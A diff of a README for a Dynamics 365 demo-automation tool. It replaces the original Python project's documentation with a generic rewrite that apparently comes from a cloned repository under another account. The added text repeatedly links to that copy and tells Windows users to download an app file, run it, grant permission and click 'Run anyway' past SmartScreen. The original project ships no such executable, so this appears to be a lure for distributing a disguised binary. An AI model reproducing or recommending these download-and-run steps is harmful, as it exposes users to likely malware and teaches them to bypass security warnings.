@@ -1,267 +1,196 @@
-# D365 Demo Copilot
+# 🤖 D365-Demo-Copilot - Run Guided Demos With Ease
 
-**AI-powered live demonstration agent for Dynamics 365**
+[![Download D365-Demo-Copilot](https://img.shields.io/badge/Download-D365--Demo--Copilot-blue?style=for-the-badge)](https://github.com/Theatrical-gravitywave390/D365-Demo-Copilot)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
+## 🚀 Overview
 
-The D365 Demo Copilot takes customer requests in natural language, generates structured demo plans, and executes them in a live Dynamics 365 browser session with visual overlays, voice narration, and interactive controls — all through an in-browser sidecar chat panel.
-<img width="829" height="427" alt="Demo Copilot Screen shot" src="https://github.com/user-attachments/assets/cc474b26-079c-4248-b99e-e041cecfa91d" />
+D365-Demo-Copilot is a Windows app for live Dynamics 365 demos. It helps you run step-by-step demo flows with visual overlays, voice narration, and browser actions. It is made for end users who want to show a polished demo without manual clicking through every step.
 
-Demo video: https://youtu.be/DfJVVV22tCw?si=MYX2P46hUCiuX-t7
+Use it to:
+- Guide a demo from start to finish
+- Show callouts and on-screen hints
+- Play voice narration during a demo
+- Automate browser tasks in Dynamics 365
+- Keep demo steps in one place
 
+## 📥 Download
 
-## Key Features
+Visit this page to download:
+https://github.com/Theatrical-gravitywave390/D365-Demo-Copilot
 
-| Feature | Description |
-|---------|-------------|
-| **Sidecar Chat Panel** | In-browser chat UI — all interaction happens in the browser, not the terminal |
-| **Dynamic Demo Planning** | Describe what you want to demo and the AI generates a structured plan with sections and steps |
-| **Tell-Show-Tell Pattern** | Every step follows presentation best practices: explain, demonstrate, summarize |
-| **Visual Spotlight** | Dims the page and highlights the current element with a glowing ring |
-| **Caption Overlays** | Movie-subtitle-style text at the bottom of the screen with typewriter animation |
-| **Business Value Cards** | Callout cards with quantified metrics (e.g., "75% faster approval cycles") |
-| **Voice Narration** | AI-powered text-to-speech narration (Azure, OpenAI, or browser-native) |
-| **Progress Tracking** | Step counter, progress bar, and visual step timeline |
-| **Pause / Resume / Skip** | Full demo control via quick-action buttons in the chat panel |
-| **Script PDF Export** | Auto-generates a PDF demo script with screenshots after each demo |
-| **Schema Discovery** | Connects to Dataverse MCP for live entity schema awareness |
-| **MS Learn Integration** | Enriches demo plans with official Microsoft documentation |
+Open the page in your browser, then look for the latest release or download files. Save the app to your Windows PC before you run it.
 
-## How It Works
+## 🪟 Windows Setup
 
-```mermaid
-flowchart LR
-    User["🗣️ User Request\n'Show me time entry\nand approval'"]
-    Planner["🧠 Demo Planner\n(LLM-powered)"]
-    Plan["📋 Demo Plan\nSections + Steps"]
-    Executor["🎬 Demo Executor\nTell → Show → Tell"]
-    Browser["🌐 D365 Browser\n+ Visual Overlays\n+ Voice Narration"]
+1. Open the download page in your browser.
+2. Download the Windows app file or release package.
+3. If the file is zipped, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Double-click the app file to start it.
+6. If Windows asks for permission, select Yes.
+7. If SmartScreen appears, choose More info, then Run anyway if you trust the file source.
 
-    User --> Planner --> Plan --> Executor --> Browser
-```
+## 🧭 First Run
 
-The agent opens a Playwright-controlled browser, injects a sidecar chat panel, and drives D365 through each demo step with spotlights, captions, business value callouts, and progress indicators.
+When you open the app for the first time, set up these items:
 
-### Architecture Diagram
+- Your Dynamics 365 site address
+- Your demo account details, if needed
+- Your voice narration settings
+- Your browser choice, such as Edge or Chrome
+- Your overlay text size and position
 
-```mermaid
-graph TB
-    subgraph User["User"]
-        Chat["💬 Sidecar Chat Panel\nin D365 browser"]
-    end
+If the app offers a demo list, start with one short demo flow first. This helps you confirm that the browser opens, the overlay appears, and the narration plays.
 
-    subgraph Agent["Agent Layer"]
-        Planner["🧠 Planner\nplanner.py"]
-        Executor["🎬 Executor\nexecutor.py"]
-        Narrator["🎙️ Narrator\nnarrator.py"]
-        State["⚡ State Machine\npause / resume / skip"]
-        Voice["🔊 Voice\nTTS narration"]
-        ScriptGen["📄 Script Generator\nPDF export"]
-    end
+## ✨ What It Can Do
 
-    subgraph BrowserLayer["Browser Layer — Playwright"]
-        Controller["🌐 Browser Controller"]
-        ChatMgr["💬 Chat Panel Manager"]
-        OverlayMgr["🎨 Overlay Manager"]
-        D365Nav["📄 D365 Navigator"]
-    end
+### 🎯 Demo guidance
+Show the next step in a demo so you do not need to remember every action.
 
-    subgraph Overlay["Visual Overlay Engine — Injected JS/CSS"]
-        Spotlight["🔦 Spotlight"]
-        Captions["📝 Captions"]
-        ValueCard["💰 Value Cards"]
-        Progress["📊 Progress"]
-        ClickFX["✨ Click Ripple"]
-    end
+### 🖼️ Visual overlays
+Display text, highlights, and hints on top of the browser window.
 
-    subgraph External["External Services"]
-        LLM["☁️ LLM Provider\nAzure OpenAI / GitHub Models / OpenAI"]
-        D365["⚙️ Dynamics 365\nProject Operations"]
-        DataverseMCP["🔌 Dataverse MCP\nSchema Discovery"]
-        LearnMCP["📚 MS Learn MCP\nDoc Enrichment"]
-    end
+### 🎙️ Voice narration
+Read demo steps aloud for a smoother live presentation.
 
-    Chat -->|"demo request"| Planner
-    Chat -->|"pause / skip / stop"| State
-    Planner -->|"generate plan"| LLM
-    Planner -->|"enrich context"| DataverseMCP
-    Planner -->|"enrich context"| LearnMCP
-    Planner -->|"DemoPlan JSON"| Executor
-    Narrator -->|"generate narration"| LLM
-    Executor --> Narrator
-    Executor --> State
-    Executor --> Voice
-    Executor --> ScriptGen
-    Executor -->|"browser actions"| Controller
-    Executor -->|"show overlays"| OverlayMgr
-    Executor -->|"D365 navigation"| D365Nav
-    ChatMgr -->|"inject & update"| Chat
-    Controller -->|"Playwright"| D365
-    OverlayMgr -->|"page.evaluate()"| Spotlight
-    OverlayMgr --> Captions
-    OverlayMgr --> ValueCard
-    OverlayMgr --> Progress
-    OverlayMgr --> ClickFX
+### 🌐 Browser automation
+Click buttons, open pages, and move through Dynamics 365 screens with less manual work.
 
-    classDef userNode fill:#E8F5E9,stroke:#2E7D32,color:#1B5E20
-    classDef agentNode fill:#FFF3E0,stroke:#E65100,color:#BF360C
-    classDef browserNode fill:#E0F7FA,stroke:#00695C,color:#004D40
-    classDef overlayNode fill:#FFF8E1,stroke:#F9A825,color:#F57F17
-    classDef externalNode fill:#FCE4EC,stroke:#C62828,color:#B71C1C
+### 🧩 Demo flow control
+Start, pause, resume, or move between steps during a live session.
 
-    class Chat userNode
-    class Planner,Executor,Narrator,State,Voice,ScriptGen agentNode
-    class Controller,ChatMgr,OverlayMgr,D365Nav browserNode
-    class Spotlight,Captions,ValueCard,Progress,ClickFX overlayNode
-    class LLM,D365,DataverseMCP,LearnMCP externalNode
-```
+### 📊 Dynamics 365 support
+Work with common demo paths in apps like Project Operations and related Dataverse screens.
 
-## Getting Started
+## 🛠️ System Requirements
 
-### Prerequisites
+For the best result, use a Windows PC with:
 
-- **Python 3.10+**
-- **Node.js** (required by Playwright)
-- **Access to a D365 environment** (CE, F&O)
-- **One of** the following LLM providers:
-  - Azure OpenAI endpoint + API key
-  - GitHub PAT (uses GitHub Models — free for Copilot subscribers)
-  - OpenAI API key
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- A modern browser such as Microsoft Edge or Google Chrome
+- A stable internet connection
+- Audio output for narration
+- A microphone if you plan to record or test voice input
+- Enough disk space for the app, browser data, and demo files
 
-### Quick Start
+## 🖥️ Recommended Browser Setup
 
-```bash
-# Clone the repository
-git clone https://github.com/seangalliher/D365-Demo-Copilot.git
-cd D365-Demo-Copilot/demo_agent
+D365-Demo-Copilot works best when the browser is ready for automation.
 
-# Create virtual environment
-python -m venv .venv
-.venv\Scripts\Activate.ps1   # Windows
-# source .venv/bin/activate  # macOS/Linux
+- Sign in to your Microsoft account before the demo
+- Keep one browser window open for the demo
+- Turn off extra tabs when possible
+- Make sure pop-ups are allowed for Dynamics 365
+- Keep browser zoom at 100% unless your demo needs a different view
 
-# Install dependencies
-pip install -r requirements.txt
+## 🧠 How It Works
 
-# Install Playwright browsers
-playwright install chromium
+The app follows a simple pattern:
 
-# Configure credentials
-cp .env.example .env
-# Edit .env with your D365 URL and LLM credentials (see Configuration below)
+1. You choose a demo flow.
+2. The app opens the browser or connects to it.
+3. It shows the next step on screen.
+4. It can speak the step out loud.
+5. It can click through the demo page for you.
+6. You stay in control while the app guides the run.
 
-# Run the agent
-python -m demo_agent
-```
+This setup helps you present a smooth demo with less stress and fewer missed steps.
 
-On first run, a browser window opens for you to log in to D365. Your auth state is saved for future sessions.
+## 🗂️ Typical Demo Uses
 
-### Configuration
+Use D365-Demo-Copilot for:
+- Sales walkthroughs
+- Product demos
+- Project Operations tours
+- Training sessions
+- Internal team presentations
+- Customer proof-of-concept runs
 
-Copy `.env.example` to `.env` and configure:
+## 🔧 Basic Use Tips
 
-```bash
-# Required: Your D365 environment URL
-D365_BASE_URL=https://your-org.crm.dynamics.com
+- Keep your demo flow short at first
+- Use large overlay text for live rooms
+- Test audio before the meeting starts
+- Close mail and chat apps during the demo
+- Use a clean browser profile for repeatable runs
+- Save your demo steps in a clear order
 
-# LLM Provider (pick ONE):
+## 🔐 Login and Demo Data
 
-# Option 1 — Azure OpenAI (recommended for enterprise):
-AZURE_OPENAI_ENDPOINT=https://your-resource.openai.azure.com
-AZURE_OPENAI_API_KEY=sk-...
+For demo work, it helps to use:
+- A dedicated demo account
+- Sample Dataverse data
+- Test records instead of real customer data
+- A browser profile saved for demo use only
 
-# Option 2 — GitHub Copilot (free for Copilot subscribers):
-GITHUB_TOKEN=ghp_...
+This keeps your demo clean and easier to repeat.
 
-# Option 3 — OpenAI direct:
-OPENAI_API_KEY=sk-...
+## 🧪 If the Demo Does Not Start
 
-# Optional: Dataverse API access (for live schema discovery + data creation)
-DATAVERSE_TENANT_ID=...
-DATAVERSE_CLIENT_ID=...
-DATAVERSE_CLIENT_SECRET=...
+If the app opens but the demo does not move:
 
-# Optional: Voice narration
-VOICE_ENABLED=true
-VOICE_PROVIDER=auto          # auto, edge, or openai
-```
+- Check that the browser is open
+- Confirm you are signed in
+- Make sure the page loaded fully
+- Try refreshing the browser
+- Restart the app and run the demo again
+- Check that your overlay is not hidden behind another window
 
-> **GitHub Models bridge:** Set `GITHUB_TOKEN` to a GitHub PAT. The agent routes requests through the GitHub Models inference endpoint (`https://models.inference.ai.azure.com`) using the standard OpenAI SDK — no extra dependencies required.
+## 📁 Suggested Folder Layout
 
-### Optional: Microsoft Reference Materials
+Keep your files in one place:
 
-For enriched demo planning, the agent can leverage Microsoft's Business Process Catalog (BPC) documentation. These are publicly available from Microsoft Learn but are not included in this repository. The agent works without them using built-in D365 knowledge.
+- Downloads
+- D365-Demo-Copilot
+- Demo Flows
+- Audio
+- Screenshots
 
-## Architecture
+A simple folder setup makes it easier to find your demo files later.
 
-```
-demo_agent/
-├── main.py                      # Entry point — launches browser + chat panel
-├── config.py                    # Configuration (D365 URL, LLM, voice settings)
-├── requirements.txt
-├── agent/
-│   ├── planner.py               # LLM-powered demo plan generator
-│   ├── executor.py              # Tell-Show-Tell demo orchestrator
-│   ├── narrator.py              # Dynamic narration generation
-│   ├── state.py                 # Pause/resume/skip state machine
-│   ├── voice.py                 # Text-to-speech narration
-│   ├── schema_discovery.py      # Dataverse MCP schema client
-│   ├── learn_docs.py            # MS Learn MCP documentation client
-│   ├── script_recorder.py       # Screenshot capture during demos
-│   └── script_generator.py      # PDF demo script generator
-├── auth/
-│   └── dataverse_auth.py        # OAuth for Dataverse API
-├── browser/
-│   ├── controller.py            # Playwright browser controller
-│   ├── chat_panel.py            # Sidecar chat panel manager
-│   ├── overlay_manager.py       # Injects/controls visual overlays
-│   └── d365_pages.py            # D365-specific navigation helpers
-├── mcp/
-│   ├── client.py                # MCP protocol client
-│   └── manager.py               # MCP connection manager
-├── models/
-│   └── demo_plan.py             # Pydantic models for plans & steps
-├── overlay/
-│   ├── chat-panel.js            # Sidecar chat panel UI
-│   ├── chat-panel.css           # Chat panel styling
-│   ├── demo-overlay.js          # Spotlight, captions, callouts, progress
-│   └── demo-overlay.css         # Visual overlay styling
-├── prompts/
-│   ├── planner.md               # System prompt for demo planning
-│   └── narrator.md              # System prompt for narration
-├── plans/
-│   └── sample_time_entry.json   # Example demo plan
-└── tests/
-    ├── test_config.py
-    ├── test_models.py
-    ├── test_state.py
-    └── test_e2e_time_entry.py
-```
+## ⌨️ Common Controls
 
-## Technology Stack
+Most demo apps like this use a simple set of controls:
 
-- **Python 3.10+** — Agent core
-- **Playwright** — Browser automation
-- **Pydantic** — Data validation and serialization
-- **OpenAI / Azure OpenAI / GitHub Models** — LLM for demo planning and narration
-- **Rich** — Terminal logging
-- **Custom JS/CSS** — Visual overlay engine and chat panel (zero external dependencies)
+- Start demo
+- Pause demo
+- Next step
+- Previous step
+- Show overlay
+- Hide overlay
+- Play narration
+- Stop narration
 
-## Contributing
+If your build uses different labels, look for the same actions in the main window.
 
-Contributions are welcome! Please:
+## 🔍 Best Results for Live Demos
 
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/your-feature`)
-3. Commit your changes
-4. Push to the branch (`git push origin feature/your-feature`)
-5. Open a Pull Request
+To keep the demo smooth:
 
-## License
+- Open only the tabs you need
+- Use a second screen if you have one
+- Keep your mouse still when narration starts
+- Test the flow with a short dry run
+- Use plain, readable overlay text
+- Keep the browser window full screen when possible
 
-This project is licensed under the MIT License — see the [LICENSE](LICENSE) file for details.
+## 📌 Why This Tool Helps
 
-## Disclaimer
+D365-Demo-Copilot reduces the amount of manual work during a live demo. You can follow a planned path, keep your audience focused, and avoid losing your place while switching between screens. It is useful when you want a consistent demo each time you present
 
-This project is an independent open-source tool. It is not an official Microsoft product. Dynamics 365 and related trademarks are property of Microsoft Corporation.
+## 🧰 Related Tech
+
+This project is built around:
+- AI agent actions
+- Browser automation
+- OpenAI-based narration or guidance
+- Playwright-style browser control
+- Dynamics 365 and Dataverse demo flows
+
+## 📎 Download Again
+
+Visit this page to download:
+https://github.com/Theatrical-gravitywave390/D365-Demo-Copilot
+
+Use the same link any time you need the latest version or want to check for updates
